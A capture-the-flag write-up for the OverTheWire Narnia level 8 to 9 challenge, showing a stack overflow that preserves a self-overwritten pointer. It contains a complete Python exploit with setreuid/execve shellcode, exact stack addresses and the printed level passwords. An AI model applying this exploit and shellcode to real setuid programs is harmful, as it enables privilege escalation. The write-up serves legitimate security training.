# Narnia Level 08 to 09

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Narnia |
| Level | 8 -> 9 |
| Status | Complete |

## Objective

Exploit the unbounded copy in `narnia8`, preserve the self-overwritten `blah` pointer long enough to control saved EIP, and recover the final password for `narnia9`.

## Given Access

User: `narnia8`

Password:

```text
i1SQ81fkb8
```

## Recon

`/narnia/narnia8.c` copies `argv[1]` byte-by-byte into a 20-byte stack buffer `bok[20]`:

```c
for(i=0; blah[i] != '\0'; i++)
    bok[i]=blah[i];
```

Important live details:

- `i` is global, not local.
- `blah` is a local pointer stored just above `bok` on the stack.
- the binary has an executable stack (`GNU_STACK ... RWE`).
- once the copy reaches offset 20, the overflow starts rewriting `blah` itself, so a naive long payload stops copying attacker-controlled bytes and begins reading whatever the damaged pointer now references.

## Method

The working path was:

1. use failed runs as a leak primitive until the final 4 leaked bytes revealed the live original `argv[1]` pointer for the exact exploit layout
2. overwrite `blah` with that same live pointer value so the copy loop keeps reading from the original argument string instead of wandering into unrelated stack memory
3. place a NOP sled and shellcode after the saved return address
4. use shellcode that first calls `setreuid(14009, 14009)` so the spawned shell keeps `narnia9` privileges instead of dropping back to `narnia8`
5. return into the sled, spawn the preserved-privilege shell, and read `/etc/narnia_pass/narnia9`

The decisive live values from the successful run were:

```text
preserved blah / argv[1] pointer: 0xffffdf62
working return address:          0xffffdf82
```

## Working Payload Shape

```text
"a" * 20
+ pack("<I", 0xffffdf62)   # preserve blah
+ "b" * 4                  # overwrite saved EBP
+ pack("<I", 0xffffdf82)   # return into sled
+ NOP sled
+ setreuid(14009,14009) + execve("/bin/sh") shellcode
```

## Commands

```bash
ssh -p 2226 narnia8@narnia.labs.overthewire.org
python3 - <<'PY'
import struct, subprocess
ptr = 0xffffdf62
ret = 0xffffdf82
shellcode=(b"\x31\xdb\x66\xbb\xb9\x36\x89\xd9\xb0\x46\xcd\x80"
           b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
payload = b'a'*20 + struct.pack('<I', ptr) + b'b'*4 + struct.pack('<I', ret) + b'\x90'*64 + shellcode
p = subprocess.Popen(['/narnia/narnia8'.encode(), payload],
                     stdin=subprocess.PIPE,
                     stdout=subprocess.PIPE,
                     stderr=subprocess.STDOUT,
                     env={})
out, _ = p.communicate(b'whoami\nid\ncat /etc/narnia_pass/narnia9\nexit\n', timeout=2)
print(out.decode('latin1', 'ignore'))
PY
```

## Result

Successful live output included:

```text
narnia9
uid=14009(narnia9) gid=14008(narnia8) groups=14008(narnia8)
1FFD4HnU4K
```

That password was then verified by logging in directly as `narnia9` and reading the final completion file.

## Lesson

For pointer-smashing copy loops, the final exploit can hinge on preserving the exact live source-pointer value for the fully built payload length. Also, a plain `execve("/bin/sh")` shell may drop privileges, so adding a `setreuid()` stage was the difference between a shell as `narnia8` and a shell that retained `narnia9` access.

## References

- https://overthewire.org/wargames/narnia/
